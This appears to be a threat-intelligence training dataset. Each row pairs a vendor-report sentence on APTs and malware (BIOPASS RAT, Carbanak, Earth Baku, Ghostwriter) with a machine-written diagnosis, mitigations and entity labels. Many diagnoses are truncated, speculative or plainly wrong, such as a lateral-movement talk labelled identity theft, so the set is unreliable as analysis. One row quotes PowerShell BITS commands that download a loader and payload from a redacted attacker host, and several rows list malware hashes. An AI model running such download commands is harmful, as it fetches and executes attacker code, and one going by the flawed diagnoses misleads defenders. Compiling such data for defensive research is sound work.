5037,"recently observed ghostwriter credential phishing domains and emails: curious gorge, a group tag attributes to china's pla ssf, has remained active against government, military, logistics and manufacturing organizations in ukraine, russia and central asia.","diagnosis: the cybersecurity issue is ghostwriter credential phishing. the entity involved is curious gorge, a group attributed to china's pla ssf. the relationship between the entities is that curious gorge has remained active against government, military,","1. implement a multi-factor authentication system to prevent unauthorized access to sensitive information and systems. 2. conduct regular security awareness training for employees to educate them on how to identify and avoid phishing attacks. 3. use anti-phishing tools such as email filters and web filters to block suspicious emails and websites. 4. conduct regular security audits and vulnerability assessments to identify and address any weaknesses in the organization's security infrastructure. 5. implement a security incident response plan to quickly detect, respond to and mitigate any cyber",location,location,identity
5030,"recently observed coldriver credential phishing domains: ghostwriter, a belarusian threat actor, has remained active during the course of the war and recently resumed targeting of gmail accounts via credential phishing.","the diagnosis is a credential phishing attack by the threat actor ghostwriter, who is located in belarus and is using a specific software and attack pattern to target gmail accounts.",1. implement multi-factor authentication (mfa) for gmail accounts to prevent unauthorized access even if credentials are compromised. 2. use anti-phishing tools and software to detect and prevent credential phishing attacks. 3. conduct regular security awareness training for employees to educate them on how to identify and avoid phishing attacks. 4. use email filters and spam blockers to prevent phishing emails from reaching employees' inboxes. 5. monitor network traffic for suspicious activity and block traffic from known malicious ips. 6. implement a,threat-actor,location,SOFTWARE
14303,content of readme.txt register.bat is used to gain administrator privilege.,privilege escalation attack | register.bat | uses | administrator privilege,"1. implementing least privilege access control policies to limit the privileges of users and processes, including administrators, to only those necessary for their tasks. 2. regularly monitoring and auditing system logs and user activities to detect any suspicious behavior or unauthorized access attempts. 3. using endpoint protection tools such as antivirus, firewalls, and intrusion detection systems to prevent and detect privilege escalation attacks. 4. conducting regular security awareness training for all employees to educate them on the risks of privilege escalation attacks and how to",FILEPATH,FILEPATH,attack-pattern
1789,"infection chain figure 1. avoslocker infection chain according to our analysis, the suspected entry point is via the zoho manageengine adselfservice plus (adss) exploit: figure 2.","avoslocker malware infection caused by a vulnerability in zoho manageengine adselfservice plus, exploited through the use of exploits.","1. patch management: regularly update software and applications to fix vulnerabilities and prevent exploitation by malware like avoslocker. 2. network segmentation: isolate critical systems and sensitive data from the rest of the network to limit the spread of malware in case of an infection. 3. endpoint protection: deploy endpoint security solutions like antivirus, firewalls, and intrusion detection/prevention systems to detect and block malware like avoslocker. 4. user awareness training: educate employees on safe browsing habits, phishing",malware,vulnerability,
3617,"in our new research blog “freemilk: a highly targeted spear phishing campaign”, our unit 42 research team has discovered an attack campaign that takes spear phishing targeting to the next level by hijacking in-progress email conversations.",diagnosis: spear phishing attack entity: unit 42 research team relationship: the research team discovered the spear phishing attack campaign and identified the attack patterns and campaign involved. the campaign uses hijacking techniques to target in-progress email conversations.,1. employee training: providing regular training to employees to identify and avoid spear phishing attacks can help prevent such attacks from being successful. 2. email filtering: implementing email filtering solutions that can detect and block suspicious emails before they reach the user's inbox can help prevent spear phishing attacks. 3. two-factor authentication: implementing two-factor authentication for email and other critical systems can help prevent unauthorized access to sensitive information. 4. endpoint protection: deploying endpoint protection solutions that can detect and block malware,identity,attack-pattern,attack-pattern
13641,the recent campaigns target senior positions in the united states and canada.,"the diagnosis is a targeted cyber attack on senior positions in the united states and canada. the campaign was specifically designed to target these individuals, with the attackers likely using sophisticated social engineering tactics to gain access to sensitive information. the campaign appears to have been carried","1. implement multi-factor authentication for all senior positions in the united states and canada to prevent unauthorized access to sensitive information. 2. conduct regular security awareness training for senior positions to educate them on social engineering tactics and how to identify and avoid them. 3. deploy advanced threat detection and prevention tools that can identify and block targeted cyber attacks, such as intrusion detection systems and firewalls. 4. conduct regular vulnerability assessments and penetration testing to identify potential weaknesses in the organization's security posture and address them before they",identity,location,campaign
13632,the code used to obtain user qq numbers protecting e-commerce platforms from water pamola’s attacks water pamola attacked online merchants with an xss script appended onto online shopping orders.,"diagnosis: the e-commerce platform is vulnerable to water pamola's attacks, specifically an xss script appended onto online shopping orders. the attacker targeted the platform using a campaign, and their identity is known. the platform should implement measures to protect against xss","1. implementing a web application firewall (waf) to detect and block malicious traffic, including xss attacks. 2. conducting regular vulnerability assessments and penetration testing to identify and remediate any weaknesses in the platform's defenses. 3. implementing strict input validation and output encoding to prevent malicious scripts from being injected into the platform's code. 4. educating employees and customers on how to identify and report potential security threats, such as suspicious emails or orders. 5. implementing multi-factor authentication",campaign,campaign,identity
4266,"the other file stealer (1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a, detected as troj_delf.xxwz) is related to a domain reported in september 2016.",the entity (hash value 1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a) is diagnosed as the malware t,1. implementing robust antivirus software that can detect and quarantine the malware t. 2. conducting regular vulnerability assessments and penetration testing to identify and address any security gaps in the system. 3. implementing network segmentation to limit the spread of malware and isolate infected systems. 4. implementing strict access controls and user authentication protocols to prevent unauthorized access to the system. 5. conducting regular security awareness training for employees to educate them on cybersecurity best practices and how to identify and report potential security threats.,malware,TIME,hash
13960,"in a us senate hearing on cybersecurity threats, senator rob portman of ohio described the strike on colonial pipeline as “potentially the most substantial and damaging attack on us critical infrastructure ever.”",cybersecurity threat: strike on colonial pipeline entity: us critical infrastructure relationship: potentially the most substantial and damaging attack diagnosis: the strike on colonial pipeline is a severe cybersecurity threat that has caused significant damage to us critical infrastructure.,1. improved network segmentation and access control to prevent attackers from gaining access to critical systems and data. 2. implementation of advanced threat detection and response systems to quickly identify and respond to potential threats. 3. regular cybersecurity training and awareness programs for employees to prevent human error and ensure adherence to security protocols. 4. regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the network and systems. 5. implementation of multi-factor authentication to prevent unauthorized access to critical systems and data. 6. regular,identity,identity,location
3697,"carbanak also performs techniques for disabling security tools, deleting files that are left in malicious activity, and modifying registry to hide configuration information.","the diagnosis is a cyber attack by the threat actor carbanak, who uses various attack patterns such as disabling security tools, deleting files, and modifying registry to hide configuration information. the relationship between the entities shows that carbanak uses these attack patterns",1. implementing multi-layered security protocols to prevent disabling of security tools by carbanak. 2. regularly backing up critical files to prevent loss due to deletion by carbanak. 3. deploying advanced threat detection and response systems to identify and mitigate the effects of carbanak's registry modifications. 4. conducting regular security audits and penetration testing to identify vulnerabilities that carbanak may exploit. 5. educating employees on cybersecurity best practices to prevent social engineering attacks that may lead,attack-pattern,attack-pattern,attack-pattern
4286,"the group still uses the badnews malware, a backdoor with information-stealing and file-executing capabilities, albeit updated with a slight modification in the encryption routine at the end of 2017, when they added blowfish encryption on top of their custom encryption described in our former patchwork blogpost.","the threat actor is using the badnews malware as an attack pattern to steal information and execute files. they have updated the malware with a slight modification in the encryption routine, adding blowfish encryption on top of their custom encryption.",1. implement robust antivirus software that can detect and remove the badnews malware and its variants. 2. conduct regular security awareness training to educate employees on how to identify and avoid phishing emails that may contain the badnews malware. 3. implement network segmentation to isolate critical systems and limit the spread of malware in case of an attack. 4. use intrusion detection and prevention systems to detect and block any attempts to exploit vulnerabilities and execute malware. 5. implement endpoint protection solutions that can detect and block malicious files,malware,attack-pattern,attack-pattern
5108,"&amp;nbsp; [lightly edited transcript of the video above] hi there, mark nunnikhoven from trend micro research, i want to talk to you about the concept of lateral movement.",diagnosis: identity theft entity: two identities (one victim and one attacker) relationship: related to each other (identity theft),"1. strengthening passwords: one of the most common ways that attackers steal identities is through weak passwords. encourage users to create strong passwords that are unique, complex, and difficult to guess. 2. two-factor authentication: two-factor authentication adds an extra layer of security to the login process, making it more difficult for attackers to gain access to an account. 3. identity verification: implementing identity verification processes can help prevent identity theft by verifying the identity of the person attempting to access",attack-pattern,identity,identity
4204,"back in february, we noted the similarities between the patchwork and confucius groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in south asia.","the diagnosis is that there is a cyber threat actor group, identified as patchwork and confucius, targeting entities primarily located in south asia. the entities targeted are identified as locations. there is a relationship between the threat actor group and the targeted entities","1. implementing strong network security measures such as firewalls, intrusion detection and prevention systems, and endpoint protection solutions to prevent unauthorized access and data breaches. 2. conducting regular security assessments and vulnerability scans to identify and address any potential weaknesses in the it infrastructure. 3. deploying advanced threat intelligence solutions that can detect and block threats in real-time. 4. educating employees on cybersecurity best practices such as password management, phishing prevention, and social engineering awareness. 5. establishing a security incident",threat-actor,TIME,threat-actor
3398,biopass rat loader backdoor.win64.biopass.a 75e03f40a088903579a436c0d8e8bc3d0d71cf2942ad793cc948f36866a2e1ad silverlight_ins.exe,"the diagnosis is that the entity ""silverlight_ins.exe"" has been infected with the biopass rat loader backdoor.win64.biopass.a malware, which is indicated by the hash value ""75e03f40a088903579",1. install and regularly update antivirus software to detect and remove malware such as biopass rat loader backdoor.win64.biopass.a. 2. implement a firewall to block unauthorized access to the system and prevent the malware from communicating with its command and control server. 3. conduct regular system scans and vulnerability assessments to identify and address any security weaknesses that could be exploited by attackers. 4. use intrusion detection and prevention systems to monitor network traffic and identify any suspicious activity or attempts to exploit vulnerabilities,malware,malware,hash
1542,"the sofacy group (aka apt28, grizzly steppe, fancy bear, strontium, sednit, tsar team, pawn storm) is a well-known hacking organization widely reported to be associated with russia by the us intelligence community, numerous media reports and other cybersecurity companies.","the sofacy group is a threat actor located in russia, known for their hacking activities.","1. implementing a strong network security system that includes firewalls, intrusion detection and prevention systems, and antivirus software to prevent unauthorized access to sensitive data and protect against malware attacks. 2. conducting regular security audits and vulnerability assessments to identify and address potential weaknesses in the system. 3. educating employees on cybersecurity best practices, such as password management, phishing awareness, and social engineering tactics, to prevent human error and minimize the risk of a successful attack. 4. implementing multi-factor authentication (",threat-actor,threat-actor,threat-actor
207,"on feb. 23, a malicious file named conhosts._exe (sha256: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591) was uploaded to a public malware repository from an organization in kyiv, ukraine.","the organization in kyiv, ukraine has uploaded a malicious file named conhosts._exe (sha256: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a267",1. implement a robust antivirus solution that can detect and quarantine malicious files like conhosts._exe. 2. conduct regular employee training sessions to educate them on the risks of downloading and opening suspicious files. 3. implement a firewall that can block incoming traffic from known malicious ip addresses. 4. use a security information and event management (siem) system to monitor and analyze network traffic for any suspicious activity. 5. implement a patch management system to ensure that all software and systems are up-to-date with,hash,location,FILEPATH
4205,"during the months that followed in which we tracked confucius’ activities, we found that they were still aiming for pakistani targets.","possible diagnosis: confucius is a threat actor targeting pakistani entities. there is a cyber threat against pakistani targets, and confucius is identified as the actor behind it. the relationship between confucius and the pakistani targets is defined as ""targets",1. implementing strong access controls and authentication mechanisms to prevent unauthorized access to sensitive information and systems. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the network infrastructure. 3. deploying advanced threat detection and prevention tools such as intrusion detection systems (ids) and intrusion prevention systems (ips) to detect and block malicious activity. 4. enhancing employee cybersecurity awareness and training to promote a culture of cybersecurity and identify potential threats. 5. implementing a,location,threat-actor,
684,"while still not seen in the wild, similar exploits in microsoft equation editor, such as such as cve-2018-0807 and cve-2018-0798, were identified by unit 42 researchers.",the entity (software) has two vulnerabilities (cve-2018-0807 and cve-2018-0798) that were identified by unit 42 researchers.,1. patch management: the entity can implement a patch management system to ensure that all software vulnerabilities are identified and patched in a timely manner. this will help to prevent future vulnerabilities from being exploited. 2. network segmentation: the entity can implement network segmentation to isolate vulnerable systems from the rest of the network. this will help to prevent the spread of malware and other threats to other systems on the network. 3. intrusion detection and prevention: the entity can implement an intrusion detection and prevention system to,identity,SOFTWARE,vulnerability
2386,"it has many of the same capabilities as another backdoor, crosswalk, which has also been used by earth baku.","the diagnosis is that a threat actor (earth baku) is using a malware (crosswalk) that has similar capabilities to another backdoor (unspecified) to carry out cyber attacks. the entities involved are the threat actor and the malware, and","1. implement a robust and up-to-date anti-malware solution that can detect and block the crosswalk malware and any other backdoors with similar capabilities. 2. conduct regular vulnerability assessments and penetration testing to identify and remediate any weaknesses in the network and systems that could be exploited by threat actors like earth baku. 3. deploy intrusion detection and prevention systems that can monitor network traffic and detect any suspicious activity, including attempts to install or execute malware. 4. implement strict access controls and authentication",threat-actor,malware,
3397,biopass rat loader backdoor.win64.biopass.a 6ee8f6a0c514a5bd25f7a32210f4b3fe878d9d417a7ebe07befc285131bae10e news.exe,"the entity ""news.exe"" has been infected with the backdoor.win64.biopass.a malware, which was loaded via the biopass rat loader. the hash value of the malware is 6ee8f6a0c514",1. implement robust antivirus and anti-malware software that can detect and remove the backdoor.win64.biopass.a malware. 2. conduct regular vulnerability assessments and penetration testing to identify and address potential security loopholes that could be exploited by malware like biopass rat loader. 3. implement network segmentation and access controls to limit the spread of malware infections. 4. educate employees on safe browsing habits and the risks associated with downloading and executing suspicious files. 5. use endpoint detection and,hash,malware,FILEPATH
3479,encrypted configurations of protux (top) and marade (bottom) in the same blog post correlating marade and protux,diagnosis: malware infection entities: protux and marade relationship: marade is a variant of protux,"1. install and regularly update anti-virus software to detect and remove malware infections, including protux and its variants such as marade. 2. use a firewall to prevent unauthorized access to your system and block any suspicious traffic that may be associated with malware. 3. implement strong password policies and multi-factor authentication to prevent unauthorized access to your system and sensitive data. 4. conduct regular security audits and vulnerability assessments to identify and address any weaknesses or vulnerabilities in your system that could be exploited by malware.",malware,malware,malware
3713,"in carbanak attacks, the groups’ attacks can involve logging into services that accept remote connections and using stolen password hashes through the “pass the hash” method.","diagnosis: carbanak attacks involve a threat actor logging into services that accept remote connections and using stolen password hashes through the ""pass the hash"" method. the threat actor uses this attack pattern to carry out the attacks.","1. implementing two-factor authentication (2fa) for all remote access services to prevent unauthorized access. 2. regularly changing passwords and using strong, complex passwords to make it difficult for threat actors to steal password hashes. 3. implementing network segmentation to limit the spread of attacks and prevent lateral movement within the network. 4. monitoring network activity and user behavior to detect and respond to suspicious activity. 5. using endpoint protection software to detect and prevent malware that may be used in carbanak",attack-pattern,threat-actor,attack-pattern
3670,"to be more specific in terms of att&ck® techniques, carbanak and fin7 share a notable number of similarities.","threat actors carbanak and fin7 are related in terms of att&ck® techniques, indicating a potential cybersecurity issue involving coordinated attacks or collaboration between the two entities.",1. implementing threat intelligence feeds and monitoring tools to detect and track the activities of carbanak and fin7. 2. conducting regular vulnerability assessments and penetration testing to identify and remediate potential weaknesses in the organization's security posture. 3. deploying advanced endpoint protection solutions that can detect and prevent malicious activities associated with carbanak and fin7. 4. implementing access controls and segmentation to limit the impact of a potential attack from carbanak and fin7. 5. conducting,threat-actor,threat-actor,
4558,"during our investigation into the turla cyberazov apps, we identified another android app first seen in the wild in march 2022 that also claimed to conduct dos attacks against russian websites.","the diagnosis is that a new android app has been identified in the wild that claims to conduct dos attacks against russian websites. this app is believed to be a type of malware, and it targets software to carry out its attacks. the app was first",1. implementing stricter app store policies and vetting processes to prevent malicious apps from being published and distributed to users. 2. developing and deploying advanced malware detection and removal tools that can identify and remove the dos malware from infected devices. 3. educating users on safe app installation practices and warning them against downloading apps from untrusted sources. 4. conducting regular security audits and vulnerability assessments of websites to identify and patch any vulnerabilities that could be exploited in dos attacks. 5. deploying,TIME,malware,SOFTWARE
5066,recently observed ghostwriter credential phishing domains:,the threat actor is using an attack pattern to conduct credential phishing using ghostwriter domains. this indicates a potential cyber espionage or cybercrime activity. it is recommended to investigate and mitigate the threat as soon as possible.,1. implement multi-factor authentication for all user accounts to prevent unauthorized access. 2. train employees on how to identify and avoid phishing emails and websites. 3. use a secure email gateway to filter out malicious emails before they reach employees' inboxes. 4. implement a web filtering solution to block access to known malicious domains and websites. 5. conduct regular vulnerability assessments and penetration testing to identify and address security weaknesses. 6. implement a security information and event management (siem) solution to monitor network,threat-actor,attack-pattern,
3178,"furthermore, biopass rat also creates scheduled tasks to load the cobalt strike shellcode during the initialization, indicating that the malicious actor behind the attack still heavily relies on cobalt strike.","the diagnosis for this cybersecurity issue is that a malware called biopass rat is being used by a malicious actor to load the cobalt strike shellcode through scheduled tasks. the actor heavily relies on cobalt strike, indicating that they may have advanced knowledge",1. implementing a robust anti-malware solution that can detect and remove biopass rat from the system. 2. conducting regular vulnerability assessments and penetration testing to identify and address any security weaknesses that could be exploited by the attacker. 3. enforcing strict access controls and user permissions to prevent unauthorized access to critical systems and data. 4. monitoring scheduled tasks and other system activities for any suspicious behavior or unauthorized changes. 5. deploying endpoint detection and response (edr) solutions that,malware,tools,tools
3180,"in this blog entry, we will dive deeper into biopass rat with a detailed technical analysis of the infection chain, the different components of the malware, and any possible associations with winnti.","the diagnosis is a potential cyber attack perpetrated by a threat actor using the biopass rat malware, which may be associated with the winnti group.",1. implementing endpoint protection software that can detect and block the biopass rat malware. 2. conducting regular vulnerability assessments and penetration testing to identify and patch any weaknesses in the network. 3. implementing multi-factor authentication to prevent unauthorized access to sensitive data and systems. 4. implementing network segmentation to limit the spread of malware in case of a breach. 5. conducting regular employee training on cybersecurity best practices and how to identify and report potential cyber threats. 6. implementing a,threat-actor,malware,
2370,"earth baku deploys its ongoing campaign, which can be traced to as far back as july 2020, through multiple attack vectors that are designed based on different exploits or the infrastructure of its targeted victim's environment: • sql injection to upload a malicious file • installment through installutil.exe in a scheduled task • possibly a malicious link (lnk) file sent as an email attachment • exploitation of the proxylogon vulnerability cve-2021-26855 to upload a china chopper web shell this campaign uses previously unidentified shellcode loaders, which we have named stealthvector and stealthmutant, and a backdoor, which we have dubbed scramblecross.","the diagnosis is a targeted cyber attack using multiple attack vectors, including sql injection, scheduled task installation, malicious email attachments, and exploitation of the proxylogon vulnerability cve-2021-26855 to upload a china chopper web shell. the attack",1. implementing a robust firewall to block unauthorized access attempts and prevent sql injection attacks. 2. regularly updating and patching systems to mitigate vulnerabilities such as the proxylogon vulnerability cve-2021-26855. 3. conducting regular security awareness training for employees to prevent them from falling victim to malicious email attachments. 4. using advanced threat detection and response tools to identify and mitigate attacks in real-time. 5. implementing strict access controls and monitoring suspicious activities to prevent the installation of,threat-actor,vulnerability,malware
3383,biopass rat loader backdoor.win32.biopass.a 30d9ffd4b92a4ed67569a78ceb25bb6f66346d1c0a7d6d6305e235cbdfe61ebe silverlight_ins.exe,"the entity silverlight_ins.exe is infected with the biopass rat loader backdoor.win32.biopass.a malware, as indicated by the hash value 30d9ffd4b92a4ed67569a78ceb25bb",1. install and regularly update antivirus software to detect and remove malware. 2. implement firewalls to block unauthorized access to the network and prevent malware from communicating with its command and control server. 3. conduct regular vulnerability assessments and penetration testing to identify and address security weaknesses. 4. train employees on how to identify phishing emails and other social engineering tactics used by cybercriminals to deliver malware. 5. use endpoint detection and response (edr) solutions to monitor and respond to suspicious activity on endpoints.,malware,hash,FILEPATH
4566,"the sandworm campaign used compromised government accounts to send links to microsoft office documents hosted on compromised domains, primarily targeting media organizations in ukraine.",diagnosis: the sandworm campaign utilized a compromised government account to conduct an attack pattern targeting media organizations in ukraine. the attack involved the use of malicious links embedded in microsoft office documents hosted on compromised domains. the campaign primarily targeted media organizations in ukraine.,1. implement multi-factor authentication for all government accounts to prevent unauthorized access and compromise. 2. conduct regular security awareness training for government employees to educate them on the dangers of phishing attacks and how to identify and avoid them. 3. implement a robust email filtering system to detect and block malicious links and attachments. 4. regularly monitor and scan government systems for any signs of compromise or suspicious activities. 5. develop and implement strict access controls and permissions for all government accounts and systems to limit the potential impact,campaign,attack-pattern,SOFTWARE
13543,"instead, malicious scripts are being executed when the administrators look into customer orders in their online shop’s administration panel.","the diagnosis is a malware attack targeting the software used by the online shop's administration panel, with the malicious scripts being executed when administrators look into customer orders. the attack may have compromised the identity of customers and poses a serious cybersecurity threat.",1. install and regularly update antivirus software on all devices used by administrators to access the online shop's administration panel. 2. implement two-factor authentication for all administrator accounts to prevent unauthorized access. 3. conduct regular security audits to identify and address vulnerabilities in the online shop's software. 4. implement network segmentation to isolate the administration panel from other parts of the network. 5. train administrators on how to identify and avoid phishing attacks and other common malware delivery methods. 6. implement a web application firewall (,identity,SOFTWARE,malware
4037,"after the threat actors get access to the vulnerable hosts by using proxylogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as nerapack) as well as its payload file (.bin). c:\windows\system32\windowspowershell\v1.0\powershell.exe -command ""&{import-module bitstransfer; start-bitstransfer 'http://<redacted>:8000/dfmanager.exe' ""%temp%/dfmanager.exe""}"" c:\windows\system32\windowspowershell\v1.0\powershell.exe -command ""&{import-module bitstransfer; start-bitstransfer 'http://<redacted>:8000/dfmanager.bin' ""c:\users\<redacted>\appdata\local\temp/dfmanager.bin""}""","the diagnosis is a cyber attack involving the proxylogon exploits and web shells. the threat actors gain access to vulnerable hosts and use bitsadmin to download a next-stage loader, which is detected as nerapack, along with its payload file. the",1. patch and update all vulnerable systems immediately to prevent the exploitation of proxylogon vulnerabilities. 2. implement multi-factor authentication (mfa) to prevent unauthorized access to systems and accounts. 3. monitor network traffic and logs for any suspicious activities and investigate any anomalies. 4. use endpoint protection solutions and keep them up-to-date to detect and prevent the use of web shells and other malware. 5. implement network segmentation to limit the spread of the attack and prevent lateral movement. 6. conduct regular,attack-pattern,FILEPATH,URL
1903,"as with bahamut applications, once downloaded and executed, it showed multiple malicious features that deal with stealing information.",threat actor uses attack pattern to steal information through bahamut applications.,1. implement strong access controls and authentication measures to prevent unauthorized access to bahamut applications. 2. regularly update and patch the bahamut applications to address any vulnerabilities that could be exploited by threat actors. 3. use encryption to protect sensitive data while it is in transit and at rest. 4. implement network segmentation to limit the potential impact of a successful attack on bahamut applications. 5. conduct regular security awareness training for employees to help them identify and report suspicious activity. 6.,attack-pattern,threat-actor,
1404,"kuluoz makes money for its owner by installing other malware, such as crimeware or fake antivirus programs.","the entity in question is likely a computer system or network that has been infected with kuluoz malware. the relationship between the entities indicates that the malware is being used to install other types of malware, such as crimeware or fake antivirus programs, which","1. implementing a robust and up-to-date antivirus and anti-malware software to detect and remove kuluoz malware and its associated malware. 2. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the computer system or network that may be exploited by kuluoz malware. 3. enforcing strict security policies, such as restricting access to sensitive data and implementing strong password policies, to prevent unauthorized access to the computer system or network. 4. educating employees on",malware,attack-pattern,attack-pattern
1811,figure 9. the powershell downloading and installing anydeskmsi,possible diagnosis: malware infection through unauthorized download and installation of anydeskmsi using powershell script. entities: - tools (id: 5340) - anydeskmsi (id: unknown) - powershell (id: unknown) relationship,1. implement a strict software policy that only allows authorized downloads and installations on company devices. 2. use antivirus software to detect and remove any malware infections. 3. monitor and restrict the use of powershell scripts to authorized personnel only. 4. conduct regular cybersecurity training for employees to educate them on the risks of downloading and installing unauthorized software. 5. use network segmentation to isolate infected devices and prevent the spread of malware to other parts of the network. 6. employ endpoint detection and response (edr),tools,tools,
1392,"palo alto networks customers receive protections against the octobercms vulnerability in the following ways: palo alto networks customers receive protections against whispergate malware in the following ways: the cortex xsoar ""whispergate & cve-2021-32648'' pack can help automatically detect and mitigate the two threats.","the diagnosis is that there are two cybersecurity issues: the octobercms vulnerability and the whispergate malware. the entities involved are palo alto networks customers, the cortex xsoar software, and the two threats. the relationship between the entities is that the cortex","1. patching and updating the octobercms vulnerability on all palo alto networks customer systems to prevent exploitation by attackers. 2. implementing robust endpoint protection solutions such as antivirus software, firewalls, and intrusion detection systems to detect and prevent the spread of the whispergate malware. 3. deploying advanced threat intelligence solutions that can detect and mitigate emerging threats such as the whispergate malware. 4. conducting regular security audits and assessments to identify vulnerabilities and gaps in the security posture of the cortex xso",identity,SOFTWARE,vulnerability
5416,asus is likely only one of the vendors that is currently being targeted by cyclops blink.,asus has been targeted by the malware cyclops blink.,"1. install and regularly update antivirus and anti-malware software to detect and remove cyclops blink. 2. implement network segmentation to separate critical systems and limit the spread of the malware. 3. conduct regular vulnerability assessments and penetration testing to identify and address weaknesses in the system. 4. use multi-factor authentication to prevent unauthorized access to sensitive information. 5. train employees on cybersecurity best practices, such as avoiding suspicious links and attachments and reporting any suspicious activity. 6. implement a security information and event",identity,malware,
803,"stolen credentials underpin some of the most critical and damaging attacks out there; both shamoon 2 and the sofacy threat actor group, for example, have made detailed use of credential theft.","credential theft attack pattern utilized by shamoon 2 and sofacy threat actor groups, who both use stolen credentials to carry out damaging attacks.",1. implement multi-factor authentication (mfa) to prevent unauthorized access even if credentials are stolen. 2. use password managers to generate and store strong passwords that are difficult to crack. 3. conduct regular security awareness training for employees to educate them on the dangers of credential theft and how to avoid falling victim. 4. monitor network activity for unusual behavior and immediately investigate any suspicious activity. 5. use endpoint detection and response (edr) tools to detect and respond to threats in real-time. 6,attack-pattern,threat-actor,threat-actor
2596,"this was followed in short order by attacks on south american telecoms providers claro and embratel, brazilian state-owned postal service “correios,” and portuguese media giant impresa.","the diagnosis is a coordinated cyber attack on multiple entities located in south america and portugal. the attackers targeted telecoms providers claro and embratel, brazilian state-owned postal service ""correios,"" and portuguese media giant impresa. the entities are",1. implementing multi-factor authentication for all employees and users accessing sensitive systems and data. 2. conducting regular vulnerability assessments and penetration testing to identify and patch potential security weaknesses. 3. establishing a security operations center (soc) to monitor network traffic and detect any suspicious activity in real-time. 4. implementing a robust incident response plan to quickly contain and mitigate the effects of any potential cyber attacks. 5. providing regular cybersecurity awareness training to all employees to educate them on the latest threats and,location,identity,location
14301,"content of the miakhalifa.rar file readme.txt provides instructions teaching the user how to turn off the anti-virus software and how to turn on the network, which the attacker needs to steal and upload data to its c&c server.",the diagnosis is a case of a malware attack that involves the use of a trojan to steal and upload data to a c&c server. the attacker provided instructions in the readme.txt file on how to turn off the anti-virus software and turn on the,"1. install and regularly update anti-malware and anti-virus software on all devices to detect and prevent trojan attacks. 2. use firewalls to block unauthorized access to the network and monitor network traffic for suspicious activity. 3. implement two-factor authentication for all user accounts to prevent unauthorized access to sensitive data. 4. regularly backup data to prevent data loss in case of a malware attack. 5. educate employees on cybersecurity best practices, such as not opening suspicious emails or downloading unknown files",FILEPATH,SOFTWARE,FILEPATH
4800,"many russian government cyber assets have remained focused on ukraine and related issues since the invasion began, while russian apt activity outside of ukraine largely remains the same.","the diagnosis is that russian government cyber assets are targeting ukraine and related issues, while russian apt activity outside of ukraine remains unchanged. the entities involved are the russian government cyber assets and ukrainian locations, as well as russian apt threat actors. the relationship","1. implementing strong network security measures such as firewalls, intrusion detection and prevention systems, and access controls to protect ukrainian locations from cyber attacks. 2. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the ukrainian network. 3. enhancing employee training and awareness programs to educate staff on how to identify and report suspicious activity and phishing attempts. 4. sharing threat intelligence with relevant organizations and government agencies to improve situational awareness and coordinate response efforts. 5. implementing",location,threat-actor,location
4165,"based on these special mutex strings, we believe the threat actors come from a chinese-speaking region.",cybersecurity issue: threat actor identification entity: chinese-speaking region relationship: located-at diagnosis: the threat actors behind the cybersecurity issue are believed to be from a chinese-speaking region based on special mutex strings.,"1. implement advanced threat intelligence tools that can identify the origin of the cyber threat actors. these tools can analyze the language, syntax, and structure of the malware code to determine if it matches the characteristics of a specific region. 2. use network traffic analysis tools to identify the source of the cyber attack. these tools can detect patterns in the network traffic that may indicate the location of the attacker. 3. conduct a thorough investigation of the attack to gather more information about the source of the threat. this",threat-actor,location,
2381,"after its payload is decrypted, stealthmutant performs process hollowing to execute its payload in a remote process.",malware (stealthmutant) uses attack pattern (process hollowing) to execute its payload in a remote process. diagnosis: process hollowing attack.,"1. implement endpoint detection and response (edr) solutions that can detect and prevent process hollowing attacks. 2. use anti-malware software that can detect and remove malware like stealthmutant. 3. implement network segmentation to isolate infected systems and prevent the spread of malware. 4. conduct regular vulnerability assessments and patch management to address vulnerabilities that can be exploited by malware. 5. train employees on cybersecurity best practices, such as not clicking on suspicious links or downloading unknown files.",attack-pattern,malware,
13149,we found that tropic trooper’s latest activities center on targeting taiwanese and the philippine military’s physically isolated networks through a usbferry attack (the name derived from a sample found in a related research).,"diagnosis: tropic trooper, a known threat actor, is targeting physically isolated networks of the taiwanese and philippine military using a usbferry attack. the attack involves the use of malware, which is being used to compromise the identity of the military","1. implement strict usb usage policies and procedures, including disabling autorun and restricting the use of external devices on military networks. 2. conduct regular cybersecurity training and awareness programs for military personnel to educate them on the risks associated with usb-based attacks. 3. deploy endpoint protection solutions that can detect and prevent malware attacks, including those carried out through usb devices. 4. use network segmentation and isolation techniques to limit the impact of any successful attack and prevent lateral movement by the attacker. 5. conduct regular vulnerability",threat-actor,location,location
3403,8b5d4840bbdce0798950cd5584e3d4564581a7698bc6cfb2892c97b826129cec silverlight_ins.exe,"the entity silverlight_ins.exe has a cybersecurity issue related to a hash identified by the id 10270. this hash is a duplicate of another entity identified by the id 49071, which is a filepath.","one potential cybersecurity solution to solve this issue is to implement a file integrity monitoring system that can detect and alert on any duplicate hashes. this system could also automatically quarantine or delete any files with duplicate hashes to prevent potential malware or other security threats. additionally, implementing regular vulnerability scans and patch management processes can help prevent the exploitation of known vulnerabilities in software such as silverlight_ins.exe. finally, providing regular cybersecurity training to employees can help prevent the introduction of malware or other security threats through social engineering tactics such as",hash,FILEPATH,
3545,"blackgear’s campaigns also use email as an entry point, which is why it’s important to secure the email gateway.","possible diagnosis: the threat actor identified as blackgear is using an attack pattern that involves email as an entry point, highlighting the need to secure the email gateway as a critical control against this threat. the relationship between the threat actor and the attack pattern is","1. implementing email filtering and blocking rules to prevent malicious emails from reaching end-users. 2. using email authentication protocols, such as spf, dkim, and dmarc, to prevent email spoofing and phishing attacks. 3. conducting regular security awareness training for employees to educate them on how to identify and report suspicious emails. 4. deploying advanced threat protection solutions, such as sandboxing, to analyze and detect malicious attachments and urls. 5. implementing multi-factor authentication to strengthen email",threat-actor,attack-pattern,
